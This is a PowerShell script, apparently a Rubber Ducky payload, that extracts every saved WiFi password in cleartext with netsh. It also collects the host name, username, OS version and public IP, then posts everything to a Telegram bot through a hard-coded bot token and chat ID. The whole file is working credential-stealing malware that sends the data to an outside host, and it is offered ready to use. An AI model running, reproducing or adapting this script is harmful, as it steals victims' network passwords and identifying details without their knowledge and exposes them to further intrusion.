<#
.SYNOPSIS
    Rubber Duck Data Collection Script - Fixed Version
.DESCRIPTION
    Collects WiFi passwords and system info, then sends to Telegram bot.
.NOTES
    GitHub: https://github.com/OGRYZOK-dev/RubberDuck
#>

# Configuration
$TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"
$REPO_URL = "https://raw.githubusercontent.com/OGRYZOK-dev/RubberDuck/main/"

# Function to send Telegram message (built-in to avoid module dependency)
function Send-TelegramMessage {
    param (
        [string]$Message
    )
    
    $url = "https://api.telegram.org/bot$TOKEN/sendMessage"
    $body = @{
        chat_id = $CHAT_ID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json" -TimeoutSec 10 | Out-Null
        return $true
    }
    catch {
        Write-Output "[!] Telegram send error: $_"
        return $false
    }
}

# Function to get WiFi passwords (built-in)
function Get-WifiPasswords {
    try {
        $output = @()
        $wifiProfiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" } | ForEach-Object { $_.Split(":")[1].Trim() }
        
        if (-not $wifiProfiles) { return "No WiFi profiles found" }

        foreach ($profile in $wifiProfiles) {
            try {
                $profileInfo = netsh wlan show profile name="$profile" key=clear
                $password = ($profileInfo | Select-String "Key Content").ToString().Split(":")[1].Trim()
                
                $output += "SSID: $profile"
                $output += "Password: $password"
                $output += "---------------------"
            }
            catch {
                $output += "Error processing profile: $profile"
                continue
            }
        }
        
        return ($output -join "`n")
    }
    catch {
        return "Error in WiFi module: $_"
    }
}

# Function to get system info (built-in)
function Get-SystemInfo {
    try {
        $output = @()
        
        $output += "Computer Name: $env:COMPUTERNAME"
        $output += "Username: $env:USERNAME"
        $output += "OS Version: $([System.Environment]::OSVersion.VersionString)"
        $output += "Date/Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        $output += "Public IP: $(try { (Invoke-WebRequest -Uri 'https://api.ipify.org' -TimeoutSec 3).Content } catch { 'Unknown' })"
        
        return ($output -join "`n")
    }
    catch {
        return "Error in system module: $_"
    }
}

# Main execution
try {
    $result = @()
    
    $result += "=== System Information ==="
    $result += Get-SystemInfo
    
    $result += "`n=== WiFi Passwords ==="
    $result += Get-WifiPasswords
    
    $finalOutput = $result -join "`n"
    
    # Truncate if too long for Telegram
    if ($finalOutput.Length -gt 4000) {
        $finalOutput = $finalOutput.Substring(0, 4000) + "...[TRUNCATED]"
    }
    
    Send-TelegramMessage -Message $finalOutput
}
catch {
    $errorMsg = "Main execution error: $_"
    try {
        Send-TelegramMessage -Message $errorMsg
    }
    catch {
        Write-Output $errorMsg
    }
}
